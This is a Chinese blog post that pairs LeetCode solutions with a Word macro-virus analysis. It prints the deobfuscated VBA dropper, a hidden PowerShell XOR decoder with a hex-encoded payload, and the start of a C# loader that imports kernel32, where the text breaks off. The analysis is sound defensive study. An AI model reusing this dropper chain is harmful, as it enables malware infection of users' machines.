@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>每日病毒分析和leetcode-4 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="leetcode 363 矩形区域内不超过K的最大数值和(直接看的题解)先穷举行，再穷举列，使用库函数可以在O(nlogn)时间复杂度内找到不超过k的数。C直接穷举列了。。 12345678910111213141516171819202122232425262728293031int maxSumSubmatrix(int** matrix, int matrixSize, int* matri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="每日病毒分析和leetcode-4">
+<meta property="og:url" content="http://example.com/2021/04/22/daily/virus/3-1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="leetcode 363 矩形区域内不超过K的最大数值和(直接看的题解)先穷举行，再穷举列，使用库函数可以在O(nlogn)时间复杂度内找到不超过k的数。C直接穷举列了。。 12345678910111213141516171819202122232425262728293031int maxSumSubmatrix(int** matrix, int matrixSize, int* matri">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-04-22T09:33:10.000Z">
+<meta property="article:modified_time" content="2021-04-24T09:45:11.515Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://raw.githubusercontent.com/TomQunChao/avatar/main/icon00.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="https://raw.githubusercontent.com/TomQunChao/avatar/main/icon00.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-daily/virus/3-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/04/22/daily/virus/3-1/" class="article-date">
+  	<time datetime="2021-04-22T09:33:10.000Z" itemprop="datePublished">2021-04-22</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      每日病毒分析和leetcode-4
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="leetcode-363-矩形区域内不超过K的最大数值和"><a href="#leetcode-363-矩形区域内不超过K的最大数值和" class="headerlink" title="leetcode 363 矩形区域内不超过K的最大数值和"></a>leetcode 363 矩形区域内不超过K的最大数值和</h2><p>(直接看的题解)先穷举行，再穷举列，使用库函数可以在O(nlogn)时间复杂度内找到不超过k的数。C直接穷举列了。。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxSumSubmatrix</span><span class="params">(<span class="keyword">int</span>** matrix, <span class="keyword">int</span> matrixSize, <span class="keyword">int</span>* matrixColSize, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> xlen=matrixSize;</span><br><span class="line">	<span class="keyword">int</span> ans=INT32_MAX;</span><br><span class="line">	<span class="keyword">if</span>(!xlen)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> ylen=matrixColSize[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">if</span>(!ylen)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> sum[<span class="number">40000</span>];</span><br><span class="line">	<span class="keyword">int</span> ss=<span class="number">0</span>;</span><br><span class="line">	<span class="comment">// printf(&quot;ok\n&quot;);</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;xlen;i++)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(sum,<span class="number">0</span>,ylen*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;xlen;j++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">0</span>;c&lt;ylen;c++)&#123;</span><br><span class="line">				sum[c]+=matrix[j][c];</span><br><span class="line">				<span class="comment">// printf(&quot;%d %d %d %d\n&quot;,i,j,c,sum[c]);</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">0</span>;c&lt;ylen;c++)&#123;</span><br><span class="line">				ss=<span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span>(<span class="keyword">int</span> cc=c;cc&lt;ylen;cc++)&#123;</span><br><span class="line">					ss+=sum[cc];</span><br><span class="line">                    <span class="comment">// printf(&quot;%d\n&quot;,ss);</span></span><br><span class="line">                    <span class="keyword">if</span>(k&gt;=ss&amp;&amp;k-ss&lt;ans)&#123;</span><br><span class="line">                        ans=k-ss;</span><br><span class="line">                    &#125;</span><br><span class="line">				&#125;</span><br><span class="line">                </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> k-ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="368-最大整除子集"><a href="#368-最大整除子集" class="headerlink" title="368 最大整除子集"></a>368 最大整除子集</h2><p>对于有序的输入数组，dp[i]表示第i个数能与前面的数构成的最大整除序列。因为除数有这个性质：如果s|d，d|c则s|c，也就是说，若arr[j]与前面的数构成一个整除序列，且arr[j]|arr[i]，则arr[i]可以与arr[j]序列中的所有数构成整除序列。这就是动态规划问题。</p>
+<p>dp[i]初始化为1</p>
+<p>dp[i]=dp[i]%dp[j]==0&amp;&amp;dp[j]&gt;=dp[i]?dp[j]+1:dp[i];</p>
+<p>为了记录构成最大数组的序列，还要使用last数组记录i的上一个</p>
+<p>为了得到有序的输入，还要复习一下快排算法= =</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qSort</span><span class="params">(<span class="keyword">int</span> *arr,<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> j=end,i=start+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> t;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;j+<span class="number">1</span>&amp;&amp;arr[i]&lt;=arr[start])i++;</span><br><span class="line">	<span class="keyword">for</span>(;j&gt;i;j--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[j]&lt;=arr[start])&#123;</span><br><span class="line">			t=arr[i];</span><br><span class="line">			arr[i]=arr[j];</span><br><span class="line">			arr[j]=t;</span><br><span class="line">			<span class="keyword">while</span>(i&lt;j&amp;&amp;arr[i]&lt;=arr[start])i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	t=arr[i<span class="number">-1</span>];</span><br><span class="line">	arr[i<span class="number">-1</span>]=arr[start];</span><br><span class="line">	arr[start]=t;</span><br><span class="line">	<span class="keyword">return</span> i<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> *arr,<span class="keyword">int</span> start,<span class="keyword">int</span> end)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(start&gt;=end)<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">int</span> mid=qSort(arr,start,end);</span><br><span class="line">	<span class="comment">// printf(&quot;%d %d %d\n&quot;,start,end,mid);</span></span><br><span class="line">	quickSort(arr,start,mid);</span><br><span class="line">	quickSort(arr,mid+<span class="number">1</span>,end);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">largestDivisibleSubset</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span>* returnSize)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> dp[<span class="number">40000</span>];</span><br><span class="line">	<span class="keyword">int</span> last[<span class="number">40000</span>];</span><br><span class="line">	<span class="keyword">int</span> maxind=<span class="number">0</span>;</span><br><span class="line">	dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">	quickSort(nums,<span class="number">0</span>,numsSize<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;numsSize;i++)&#123;</span><br><span class="line">		<span class="keyword">int</span> maxi=i;</span><br><span class="line">		dp[i]=<span class="number">1</span>;</span><br><span class="line">		last[i]=i;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(nums[i]%nums[j]==<span class="number">0</span>&amp;&amp;dp[j]&gt;=dp[maxi])&#123;</span><br><span class="line">				maxi=j;</span><br><span class="line">				dp[i]=dp[j]+<span class="number">1</span>;</span><br><span class="line">				last[i]=j;</span><br><span class="line">				<span class="keyword">if</span>(dp[maxind]&lt;dp[i])&#123;</span><br><span class="line">					maxind=i;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	*returnSize=dp[maxind];</span><br><span class="line">	<span class="keyword">int</span> *res=(<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*dp[maxind]);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=dp[maxind]<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">		res[i]=nums[maxind];</span><br><span class="line">		maxind=last[maxind];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后时间比别人快，击败96%；内存消耗比较大，应该是两个40000的数组hhhh。换了malloc果然内存降下来了，剩下的内存消耗应该是快排递归和last数组了。</p>
+<h2 id="Word宏病毒样本分析"><a href="#Word宏病毒样本分析" class="headerlink" title="Word宏病毒样本分析"></a>Word宏病毒样本分析</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1287476-1-1.html">https://www.52pojie.cn/thread-1287476-1-1.html</a></p>
+<p>第一次分析，详细看看步骤(虚拟机已断网)</p>
+<h3 id="调试宏病毒"><a href="#调试宏病毒" class="headerlink" title="调试宏病毒"></a>调试宏病毒</h3><ol>
+<li>按住shift键</li>
+<li>点击开启宏</li>
+<li>释放shift</li>
+<li>按下alt+11打开宏调试器</li>
+<li>调试宏</li>
+</ol>
+<p>下面 Sub Document_Open()是入口程序</p>
+<p>被混淆了，复制代码之后使用<a target="_blank" rel="noopener" href="https://www.automateexcel.com/vba-code-indenter/">automateexcel.com/vba-code-indenter</a> 格式化一下，得到如下程序</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Option</span> <span class="keyword">Explicit</span></span><br><span class="line"></span><br><span class="line">Private Sub SnottineSS(ByVal a1 As Variant, ByVal a2 As Variant, ByVal a3 As Variant, ByVal a4 As Long)</span><br><span class="line">    </span><br><span class="line">    a1.Create Lethbridge(ActiveDocument.Variables(<span class="string">&quot;l26cd3c2c2f351&quot;</span>).Value), a2, a3, a4</span><br><span class="line">    </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Document_Open()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Dim</span> Garniture   <span class="keyword">As</span> <span class="built_in">Object</span>: <span class="keyword">Set</span> Garniture = GetObject(Lethbridge(ActiveDocument.Variables(<span class="string">&quot;de9a2c49a42b6&quot;</span>).Value))</span><br><span class="line">    SnottineSS Garniture, Null, Null, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Private</span> <span class="keyword">Function</span> Lethbridge(<span class="keyword">ByVal</span> Garniture <span class="keyword">As</span> <span class="built_in">String</span>) <span class="keyword">As</span> <span class="built_in">String</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Dim</span> Hulkier     <span class="keyword">As</span> <span class="built_in">Long</span>: <span class="keyword">Dim</span> Humoursome() <span class="keyword">As</span> <span class="built_in">Byte</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">GoTo</span> NoNapparitioNal</span><br><span class="line">    </span><br><span class="line">    Dickinson:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">For</span> Hulkier = <span class="number">0</span> <span class="keyword">To</span> UBound(Humoursome)</span><br><span class="line">        </span><br><span class="line">        Humoursome(Hulkier) = Abs(Humoursome(Hulkier) - <span class="number">14</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">GoTo</span> SnottineSS</span><br><span class="line">    <span class="keyword">Exit</span> <span class="keyword">Function</span></span><br><span class="line">    </span><br><span class="line">    Slinky:</span><br><span class="line">    </span><br><span class="line">    MsgBox <span class="string">&quot; Above steps are still valid.&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Exit</span> <span class="keyword">Function</span></span><br><span class="line">    NoNapparitioNal:</span><br><span class="line">    </span><br><span class="line">    Humoursome = StrConv(Garniture, <span class="number">256</span> / <span class="number">2</span>, <span class="number">1000</span> + <span class="number">55</span>)</span><br><span class="line">    <span class="keyword">GoTo</span> Dickinson</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Exit</span> <span class="keyword">Function</span></span><br><span class="line">    SnottineSS:</span><br><span class="line">    </span><br><span class="line">    Lethbridge = StrConv(Humoursome, <span class="number">32</span> * <span class="number">2</span>, <span class="number">1000</span> + <span class="number">55</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Exit</span> <span class="keyword">Function</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">GoTo</span> Crossville</span><br><span class="line">    </span><br><span class="line">    Crossville:</span><br><span class="line">    </span><br><span class="line">    MsgBox <span class="string">&quot; this solution will provide modules&quot;</span></span><br><span class="line">    <span class="keyword">Exit</span> <span class="keyword">Function</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
+
+<p>在 Sub Ducument_Open()下断点，点击运行后进入debug状态</p>
+<p>F8单步步入，到Lethbridge中</p>
+<p>然后视图-&gt;本地窗口，监视变量，之后一直单步步入，碰到循环就执行到光标处，直到ExitFunction前，观察到解密字符串 “winmgmts:\.\root\cimv2:Win32_Process”</p>
+<p>搜索这个Win32_Process对象，<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-tasks--processes%EF%BC%8C%E5%BE%97%E5%88%B0%E8%BF%99%E4%B8%AA%E5%AF%B9%E8%B1%A1%E4%B8%BB%E8%A6%81%E7%94%A8%E6%9D%A5%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B%E3%80%81%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF">https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-tasks--processes，得到这个对象主要用来创建进程、获取进程信息</a></p>
+<p>后面这个字符串传入了GetObject，然后传入了SnottineSS函数</p>
+<p>然后又解密了一个字符串，运行后得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;powershell -WindowStyle Hidden </span><br><span class="line">function y171e &#123;param($z4627)$k58be9&#x3D;&#39;a57157c&#39;;$yce74a&#x3D;&#39;&#39;;for ($i&#x3D;0; $i -lt $z4627.length;$i+&#x3D;2)&#123;$vc2775&#x3D;[convert]::ToByte($z4627.Substring($i,2),16);$yce74a+&#x3D;[char]($vc2775 -bxor $k58be9[($i&#x2F;2)%$k58be9.length]);&#125;return &quot;</span><br></pre></td></tr></table></figure>
+
+<p>格式化一下</p>
+<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># powershell -WindowStyle Hidden </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y171e</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>(<span class="variable">$z4627</span>)<span class="variable">$k58be9</span> = <span class="string">&#x27;a57157c&#x27;</span>; </span><br><span class="line">    <span class="variable">$yce74a</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$z4627</span>.length; <span class="variable">$i</span> += <span class="number">2</span>) &#123; </span><br><span class="line">        <span class="variable">$vc2775</span> = [<span class="type">convert</span>]::ToByte(<span class="variable">$z4627</span>.Substring(<span class="variable">$i</span>, <span class="number">2</span>), <span class="number">16</span>); </span><br><span class="line">        <span class="variable">$yce74a</span> += [<span class="built_in">char</span>](<span class="variable">$vc2775</span> <span class="operator">-bxor</span> <span class="variable">$k58be9</span>[(<span class="variable">$i</span> / <span class="number">2</span>) % <span class="variable">$k58be9</span><span class="type">.length</span>]); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一条命令运行一个ps1脚本</p>
+<p>TODO 此处没调试到powershell的真实脚本？</p>
+<p>直接使用文章里的</p>
+<figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">powershell  <span class="keyword">Hidden</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">y171e</span></span> &#123;<span class="keyword">param</span>(<span class="variable">$z4627</span>)<span class="variable">$k58be9</span>=<span class="string">&#x27;a57157c&#x27;</span>;<span class="variable">$yce74a</span>=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$z4627</span>.length;<span class="variable">$i</span>+=<span class="number">2</span>)&#123;<span class="variable">$vc2775</span>=[<span class="type">convert</span>]::ToByte(<span class="variable">$z4627</span>.Substring(<span class="variable">$i</span>,<span class="number">2</span>),<span class="number">16</span>);<span class="variable">$yce74a</span>+=[<span class="built_in">char</span>](<span class="variable">$vc2775</span> <span class="operator">-bxor</span> <span class="variable">$k58be9</span>[(<span class="variable">$i</span>/<span class="number">2</span>)%<span class="variable">$k58be9</span><span class="type">.length</span>]);&#125;<span class="keyword">return</span> <span class="variable">$yce74a</span>;&#125;</span><br><span class="line"><span class="variable">$z24c573</span> = <span class="string">&#x27;14465e5f52173018464354580c16125c595615641a1241525c1b65160f415e5c50192a0f4152435a4730044741585652105a4044585b5043324c4445505a4d255c56565b5810155c54420e4210085b5011664e1015505a1f7c785814465e5f5217301846435458192d04410c3c3f471603595e5215540f004644114c5502530c0f024e6c270d597e5c455811151d155a50450d04590403171b260f41454865580a0f410a137252173147585274530713504442171e3e1140555d5c5443124156455c5443044d4354475943285b436141454317020008571f2a0f41674547171b59510404031b1015475e5f52171556575206061e583a715b5d7c5a130e474319175c06135b525d0605414d705945474e330e5c594508152f0e54537d5c551100474e131c6a1314575b5856171015544358561706194152435b172a0f41674547170657030207510e4b124145585b50431b560154541e583a715b5d7c5a130e474319175c06135b525d0605414d705945474e330e5c594508153508474344545b33135a435456434148684744575b0a0215444554430a021552494152110f15555e5a5b43090254040d014b285b43614145430c5156060d01574d607e5f41671713155c0302550050571b445c5917414d545554515158195844411716085b4311470f5703060e180e6c270d597e5c455811151d157a50450d045904031b530f0d171b745b4311186558585b435e4367435d7858150478525c5a451a43196454417b02124172434758115c53565d46524a3c464350415e0041504f4550450d41435858511706070056541d7e0d1565434315565a550d5209197e0d15654343155b5b03040554195e0d15155005560106480e4744575b0a0215444554430a02155e5f411700500c04531d1e18285b4361414543020756540753555c500107000107581d4e0002060649170701000f5755000f0057025051530755171e4a5a5c511956050204075307140a2a0f416745471939044758184e7e0d1565434315455a57060308060a1556020e531d545100500555031b1a500206541d155151000f0501025b570302050505530702000507025454060203040641481c0c58531f11580304050c04425c7c59456543114f6f52435a1e18347c5945654311415d55505405075c1d62785b433315471e040e420a0f41175a0c5450560c0a010e5e05495d0052000f5549470e0706035a52195f535456510519074901074f0e4043115e0e0052020e181c4c211841526a68170904045255084c531906061d054f05071907490c071e5a7c5945654311415b55020700025c785643465f020d1b765d59580029725b5e57560f49061e0a785611125d565d1b740c114c1f5b5006060519071d5b55505302561d061e5804530250501f0d044217785b433315471f430c0150550c041f61582a0f4101051d1e48514d070104554a4d5b55020700024d061e0a484a1e124145585b504312040f0253565e245b415847580d0c5059451b70061573585d515211315443591d720d175c455e5b5a060f41196245520008545b775a5b070447197045470f085656455c580d255443501c174841176b6d560e51540015111e171a500206541d155707000705530257431c0c5f50404336505572595e060f411f181b730c165b5b5e545325085952194c065450501f13050e5750010405040355515103520152565700010453020154030700050f57570100050602025502070704045750015204060354540d070905035756010300530255540d075401525754000f0504060251530552040155530254050600505703020205015555000f0654035251500355050357050005131c1b10500d0457541e583147585250441032415643417e0d075a174803540153085954421733135a5454464430155445457c59050e1d44000d0405001c0c614758000446441f66430213411f48035401531c0c43504316135b17010e4a1314575b585617101554435856171015475e5f52171a500206541d4417135c5956155a06590c0e051c4c1015475e5f52171b59510404030a4100000000000000430e4445475e0d06155207030255050c0a13170c050e471f585b43430808070a155e5f0c500f080c034d2d505956415f58081e0a031c4c011841521143005458570a725a59150447431f6158211841521958525b580c031f664201124145585b504b08190518190655480e5207030255050c1c0c1d540b00471e19430054585769490d535054036c195c185148104f09510456571b7b545b501709681e0a4845061540455f155255570001550c0c1e1c&#x27;</span>;</span><br><span class="line"><span class="variable">$z24c5732</span> = y171e(<span class="variable">$z24c573</span>);</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="variable">$z24c5732</span>;</span><br><span class="line">[<span class="type">yba2983</span>]::c193b();</span><br></pre></td></tr></table></figure>
+<p>到了$z24c5732赋直接<code>echo $z24c5732</code>，就得到了下面的cs代码</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;<span class="keyword">using</span> System.Runtime.InteropServices;<span class="keyword">using</span> System.Diagnostics;<span class="keyword">using</span> System.IO;<span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">yba2983</span>&#123;[DllImport(<span class="string">&quot;kernel32&quot;</span>,EntryPoint=<span class="string">&quot;GetProcAddress&quot;</span>)]<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">v779b</span>(<span class="params">IntPtr x8d356,<span class="keyword">string</span> v7be73</span>)</span>;[DllImport(<span class="string">&quot;kernel32&quot;</span>,EntryPoint=<span class="string">&quot;LoadLibrary&quot;</span>)]<span class="function"><span class="keyword">public</span> <span 